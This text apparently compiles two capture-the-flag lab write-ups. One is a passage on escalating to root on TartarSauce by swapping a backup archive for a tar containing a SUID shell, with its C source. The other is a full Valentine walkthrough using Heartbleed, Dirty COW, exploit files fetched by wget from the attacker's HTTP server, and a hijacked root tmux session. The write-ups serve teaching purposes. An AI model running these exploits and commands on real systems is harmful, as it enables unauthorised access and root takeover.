# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Let’s breakdown what the script is doing. First, the following variables are being initialized in the script.

```text
basedir=/var/www/html #dir
bkpdir=/var/backups #dir
tmpdir=/var/tmp #dir
testmsg=/var/backups/onuma_backup_test.txt #file
errormsg=/var/backups/onuma_backup_error.txt #file
tmpfile=/var/tmp/.[random-sha1-value] #file
check=/var/tmp/check #dir
```

Then the script performs the following actions.

1. Recursively deletes the files/directories: _/var/tmp/.\*_ and _/var/tmp/check_.
2. Creates a gzip file of the directory _/var/www/html_ and saves it in the file _/var/tmp/.\[random-sha1-value\]_.
3. Sleeps for 30 seconds.
4. Creates the directory _/var/tmp/check._
5. Changes to the directory _/var/tmp/check_ and extract the gzip _/var/tmp/.\[random-sha1-value\]_.
6. If the files in _/var/www/html_ are different from the files in the backup it created _/var/tmp/check/var/www/html_, then report error. Otherwise, move file _/var/tmp/.\[random-sha1-value\]_ to _/var/backups/onuma-wwww-dev.bak_ and remove everything in the _check_ directory and any files that start with the character “_._”. Those would be the backup _.\[random-sha1-value\]_ files it created.

The exploit for this is not very intuitive so bear with me as I try to explain it. When the backup is being created, the script sleeps 30 seconds before it executes the rest of the commands. We can use these 30 seconds to replace the backup tar file that the script created with our own malicious file.

After the 30 seconds pass, it will create a directory called “_check_” and decompress our malicious backup tar file there. Then it will go through the integrity check and fail, thereby giving us 5 minutes before the next scheduled task is run, to escalate privileges. Once the 5 minutes are up, the _backuperer_ program is run again and our files get deleted.

The way we’re going to escalate privileges is by creating our own compressed file that contains an SUID executable.

Hopefully that makes some sense. Let’s start our attack.

First, create the directory _var/www/html_ in our attack machine. Then place the following [_setuid.c_](https://medium.com/@falconspy/useful-oscp-notes-commands-d71b5eda7b02) program file in the directory.

```text
#include <unistd.h>int main()
{
    setuid(0);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}
```

Compile the program.

```text
gcc -m32 -o setuid setuid.c
```

* **-m32:** 32 bit architecture since the target machine is running a 32 bit os
* **-o:** output file

Then set the SUID bit on the compiled program.

```text
root@kali:~/Desktop/var/www/html# chmod u+s setuidroot@kali:~/Desktop/bla1/var/www/html# ls -la
total 24
drwxr-xr-x 2 root root  4096 Jan 18 11:24 .
drwxr-xr-x 3 root root  4096 Jan 18 10:09 ..
-rwsr-xr-x 1 root root 15532 Jan 18 11:24 setuid
```

Since we’re running as root in kali \(our attack machine\), the owner of the file is root and therefore the SUID bit allows a non-privileged user to execute the file with root privileges.

Now compress the entire _var_ directory and save it in the file _exploit_.

```text
tar -zcvf exploit var
```

Set up a python server on your attack machine.

```text
python -m SimpleHTTPServer 5555
```

On your target machine, download the compressed exploit file in the directory _/var/tmp_.

```text
http://10.10.14.12:5555/exploit
```

Now wait for the _backuperer_ scheduled service to run and create the backup file. We know this happens every 5 minutes. To view how much time is left before the scheduled service is going to run again, use the following command.

```text
systemctl list-timers
```

When the service is run, view the content of the directory.

```text
onuma@TartarSauce:/var/tmp$ ls -la
total 11280
drwxrwxrwt  8 root  root      4096 Jan 18 21:01 .
drwxr-xr-x 14 root  root      4096 Feb  9  2018 ..
-rw-r--r--  1 onuma onuma 11511681 Jan 18 21:01 .e84f032e69e2e221528b5c1c2ea7fa946a905584
-rw-r--r--  1 onuma onuma     2765 Jan 18 11:46 exploit
drwx------  3 root  root      4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
drwx------  3 root  root      4096 Jan 18 20:41 systemd-private-6490911d22fe49afb4fe34c1971285c9-systemd-timesyncd.service-5H4XIC
....
```

The program generated backup compressed file is .e84f0\*\*\*\*. Replace it with our exploit file.

```text
cp exploit .e84f032e69e2e221528b5c1c2ea7fa946a905584
```

Now we just have to wait for 30 seconds \(sleep time\) before the .e84f0\*\*\*\* tar file \(which is really our exploit file\) is decompressed and saved in the directory check.

```text
onuma@TartarSauce:/var/tmp$ ls -la
total 44
drwxrwxrwt  9 root  root  4096 Jan 18 21:01 .
drwxr-xr-x 14 root  root  4096 Feb  9  2018 ..
-rw-r--r--  1 onuma onuma 2765 Jan 18 21:01 .e84f032e69e2e221528b5c1c2ea7fa946a905584
drwxr-xr-x  3 root  root  4096 Jan 18 21:01 check
-rw-r--r--  1 onuma onuma 2765 Jan 18 11:46 exploit
....
```

Enter the /_check/var/www/html_ directory.

```text
onuma@TartarSauce:/var/tmp$ cd check/var/www/html/
onuma@TartarSauce:/var/tmp/check/var/www/html$ ls -la
total 24
drwxr-xr-x 2 root root  4096 Jan 18 11:24 .
drwxr-xr-x 3 root root  4096 Jan 18 10:09 ..
-rwsr-xr-x 1 root root 15532 Jan 18 11:24 setuid
```

There we’ll see our setuid program with the SUID bit set! The reason the program still has the SUID bit set, is because when the compressed file was decompressed, it was decompressed with root privileges \(the privileges the program was running with\) and therefore, the permissions on the file were preserved.

Run the setuid program.

```text
onuma@TartarSauce:/var/tmp/check/var/www/html$ ./setuid
root@TartarSauce:/var/tmp/check/var/www/html# whoami
root
```

We are root! Grab the _root.txt_ flag.

![](https://miro.medium.com/max/806/1*9SSylldbmqFqkWgQ5yCwNQ.png)

## Lessons Learned <a id="d067"></a>

To gain an initial foothold on the box we exploited one vulnerability.

1. Use of known vulnerable components. The WordPress application was using an outdated plugin which was vulnerable to RFI. This allowed us to run a reverse shell back to our attack machine. The administrator should have updated the plugin to the most recent version.

To escalate privileges we exploited two vulnerabilities.

1. Sudo security misconfiguration of the tar binary. A non-privileged user was given the ability to run the tar binary with onuma user privileges. Since tar has the ability to run a shell, we were able to exploit it to get a shell with onuma user privileges. The administrator should have conformed to the principle of least privilege when setting permissions.
2. Security misconfiguration of scheduled service. A service that takes in user controlled files was running every 5 minutes. The service first compressed a backup file and then took that backup file back as input to the program. Since the file was created with user privileges, we were able to replace it with a malicious file that escalated our privileges to root. The administrator should have either restricted the permissions on the created backup file to root privileges or ran the service with user privileges.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
valentine-writeup-w-o-metasploit.md
# Valentine Writeup w/o Metasploit

![](https://miro.medium.com/max/584/1*y9ibWzkz5qcYJHJ4n7T2DA.png)

## Reconnaissance <a id="38e3"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA htb/valentine/nmap/initial 10.10.10.79
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that three ports are open:

* **Port 22**: running OpenSSH 5.9p1
* **Ports 80 & 443:** running Apache httpd 2.2.22

![](https://miro.medium.com/max/874/1*U5tqES-_Zhq-rH7XI6IsIQ.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA htb/valentine/nmap/full 10.10.10.79
```

We get back the following result. No other ports are open.

![](https://miro.medium.com/max/873/1*LY_UzlHQ5Nbv1Vu2EuqpXQ.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA htb/valentine/nmap/udp 10.10.10.79
```

I managed to root the box and write this blog, while this UDP scan still did not terminate. So for this blog, I don’t have the UDP scan results.

## Enumeration <a id="a8fc"></a>

Visit the site in the browser.

![](https://miro.medium.com/max/1036/1*tiRrJBOOEJeDVhN_Plckzw.png)

It only contains a picture \(which is a big indication of the vulnerability we’ll find\) and no other links. So we’ll have to run Gobuster.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.79
```

We get back the following results.

![](https://miro.medium.com/max/877/1*efzWPhYsecqzn_JFpipsMg.png)

/index, /omg and /server-status lead nowhere. /encode and /decode seem to be scripts that encode and decode strings. /dev on the other hand proves to be interesting.

![](https://miro.medium.com/max/516/1*m2IHc2jaf6X25WDex3uFPw.png)

Click on the hype\_key to get the following page.

![](https://miro.medium.com/max/1040/1*neCI86lS5ymOS98kJd0zPQ.png)

It contains a string that is hex encoded. Let’s use an [online tool](https://conv.darkbyte.ru/) to convert it to text. We find out that it is an RSA private key!

![](https://miro.medium.com/max/1311/1*dnlWAvC54dhMGUnpgg00Sg.png)

Take the converted text format and save it into a hype\_key file.

**Disclaimer:** You should NEVER enter your or anyone else’s credentials in online tools just in case it gets logged at the backend! In this case, it doesn’t matter since this is a fake security assessment.

We’ll try and ssh using our newly found private key. Based on the naming convention of pub/priv keys, “hype” is likely the username.

```text
ssh -i hype_key hype@10.10.10.79
```

* **-i:** Selects a file from which the identity \(private key\) for RSA authentication is read.

I get back the following error.

![](https://miro.medium.com/max/680/1*9Pt0cUN3RdmIoh6MDQuVQg.png)

Since a private key is equivalent to a password, it should only be readable by you. We resolve the error using the following command.

```text
chmod 400 hype_key
```

However, we are prompted for a password that we still don’t have and so we need to do more enumeration.

Run nmap’s vulnerability scan script to determine if any of the services are vulnerable.

```text
nmap --script vuln -oA vuln-scan 10.10.10.79
```

![](https://miro.medium.com/max/875/1*wKyVdJiL061zPoV4xU-Fwg.png)

Port 443 is running a version of OpenSSL that is vulnerable to Heartbleed!

If you don’t know what that is, here’s a [great comic ](https://xkcd.com/1354/)explaining it. It is essentially a vulnerability in the popular OpenSSL cryptographic software library. This vulnerability allows anyone on the Internet to read the memory of the systems protected by this vulnerable version of OpenSSL. This can lead to the compromise of secret keys, passwords, information, etc. It also allows attackers to eavesdrop on communications. There’s a whole site dedicated to the [Hearbleed bug](http://heartbleed.com/).

## Gaining an Initial Foothold <a id="1d2f"></a>

Now that we know for sure that port 443 is running a vulnerable version of OpenSSL, let’s try and exploit it to gain an initial foothold on the target machine.

First, get the exploit from [online](https://gist.github.com/eelsivart/10174134#file-heartbleed-py-L8) and clone it.

```text
git clone https://gist.github.com/10174134.git
```

Run the script to view the help instructions.

![](https://miro.medium.com/max/827/1*ryj0WqqLxw5hTPGFqt7ZxQ.png)

Let’s run the exploit with a loop number of 10. We might have to run the script multiple times or increase the loop size depending on how useful the content of the memory dump is.

```text
python heartbleed.py -p 443 -n 10 10.10.10.79
```

We’re looking for hype’s passphrase so that we could SSH into his account.

After rummaging through the memory dump, we find the following strings.

![](https://miro.medium.com/max/876/1*a2J8Vy4DQgirDztc2Onz7A.png)

Someone used the decode.php script on the website to decode a string of characters. Copy the string and use the site to decode it.

![](https://miro.medium.com/max/512/1*Wy6UX9qQr8bUFr1FPyQD3Q.png)

This looks like a password! Let’s use it to ssh into hype’s account.

```text
ssh -i hype_key hype@10.10.10.79
```

We have a low privileged shell!

![](https://miro.medium.com/max/652/1*Ab0JppTOQT15QzzOTzbqgw.png)

Grab the user flag.

![](https://miro.medium.com/max/502/1*F59vVNSi-MfvvrMczOuSgw.png)

We need to escalate privileges.

## Privilege Escalation <a id="cc00"></a>

Grab the [LinEnum](https://github.com/rebootuser/LinEnum) script if you don’t already have it. In the attack machine, start up a server in the directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine download the script.

```text
wget http://10.10.14.6:5555/LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

We get back many results of which two are interesting.

First, it’s running an old version of Ubuntu that is probably vulnerable to [Dirty COW](https://dirtycow.ninja/). Dirty COW is a privilege escalation vulnerability which exploits a race condition in the way the Linux kernel’s memory subsystem handles the copy-on-write \(COW\) breakage of private read-only memory mappings.

![](https://miro.medium.com/max/561/1*BrazHc5GyWfr26QOvRJlaA.png)

Second, there’s an active tmux session that is owned by root.

![](https://miro.medium.com/max/919/1*XfFIN0eDDp1hhhxhygwlrQ.png)

According to the [tmux man page](http://man7.org/linux/man-pages/man1/tmux.1.html):

> tmux is a terminal multiplexer: it enables a number of terminals to be  
> created, accessed, and controlled from a single screen.

It’s essentially a shell that is owned by root! So if we can enter this active tmux session, any command we run there is executed with root privileges. This one I didn’t figure out on my own, I had to use[ ippsec’s help](https://www.youtube.com/watch?v=XYXNvemgJUo).

Alright, so we have two ways of escalating privileges.

**Privilege Escalation \#1: Dirty COW Vulnerability**

To confirm that the target machine is vulnerable to Dirty COW, download the [Linux Exploit Suggester](https://github.com/jondonas/linux-exploit-suggester-2) script. In the attack machine, start up a server in the directory where the script resides.

```text
python -m SimpleHTTPServer 5555
```

Download the exploit on your target machine.

```text
wget http://10.10.14.6:5555/linux-exploit-suggester-2.pl
```

Run the script.

```text
./linux-exploit-suggester-2.pl
```

We confirm that it is vulnerable to Dirty COW.

![](https://miro.medium.com/max/685/1*lfHXPU0KmXSl9DwXO72y0w.png)

I tried several of the exploits on this [page](https://dirtycow.ninja/) but they didn’t work. Therefore, I ended up using this [exploit](https://github.com/FireFart/dirtycow/blob/master/dirty.c).

Clone the exploit on the attack machine.

```text
git clone https://gist.github.com/e9d4ff65d703a9084e85fa9df083c679.git
```

Start up a server in the directory where the exploit resides.

```text
python -m SimpleHTTPServer 5555
```

Transfer the exploit to the target machine.

```text
wget http://10.10.14.6:5555/dirty.c
```

Compile the file as per the included compile instructions.

```text
gcc -pthread dirty.c -o dirty -lcrypt
```

Run the exploit.

```text
./dirty
```

Choose the password for the newly created user.

![](https://miro.medium.com/max/620/1*wdOtAeCiuFtOwRoxEErCzQ.png)

Change to the newly created user.

```text
su firefart
```

We have root privileges! Grab the root flag.

![](https://miro.medium.com/max/554/1*DyoXBLgZIQZPxj3VN4I_0g.png)

**Privilege Escalation \#2: Attach to Root Owned tmux Session**

In the target machine, attach to the tmux shell using the following command.

```text
tmux -S /.devs/dev_sess
```

![](https://miro.medium.com/max/830/1*OTAZRai6ctSreIOWA87Ccg.png)

Since this is a session owned by root, we have root privileges!

## Lessons Learned <a id="0914"></a>

To gain an initial foothold on the target machine we required two pieces of information: \(1\) the private key and \(2\) the passphrase to ssh into a user’s account. We got the private key by enumerating the directories and files that are available on the web server. As for the passphrase we exploited the Heartbleed bug in the vulnerable OpenSSL version used on the target machine.

Getting the private key could have been avoided if the user did not publish his credentials on a public web server. As for the passphrase, this could have been avoided if the patched version of OpenSSL was installed.

To escalate to root privileges we had two options: \(1\) exploit the Dirty COW vulnerability, or \(2\) attach to a tmux session that was owned by root.

Exploiting Dirty COW could have been avoided if the target machine was patched. As for the tmux privilege escalation, I’m not entirely sure that it is a vulnerability \(and I stand to be corrected\). It seems to be an intended functionality of tmux that allows any user on the box to attach to any session opened on that box. Precautions can be taken by \(1\) not running your tmux session as root and using sudo within the tmux session if you need root privileges, and \(2\) closing the tmux session once you’re done instead of having it run \(and accessible\) the entire time.

# -------------------------------FIN-------------------------------------
